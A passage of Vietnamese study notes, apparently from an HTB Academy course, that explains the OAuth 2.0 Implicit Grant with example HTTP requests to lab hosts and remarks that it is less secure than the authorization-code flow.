  "email": "[email protected]",
  "id": 1337
}
```

#### **2. Implicit Grant (Grant ủy quyền ngầm)**
Grant này nhanh hơn nhưng kém an toàn hơn do token truy cập được trao trực tiếp cho client mà không qua mã ủy quyền.

**Bước 1: Yêu cầu ủy quyền với response_type là `token`**
```http
GET /auth?client_id=1337&redirect_uri=http://academy.htb/callback&response_type=token&scope=user&state=a45c12e87d4522 HTTP/1.1
Host: hubgit.htb
```

**Bước 2: Nhận token truy cập trực tiếp**
```http
GET /callback#access_token=RsT5OjbzRn430zqMLgV3Ia&token_type=Bearer&expires_in=3600&scope=user&state=a45c12e87d4522
```


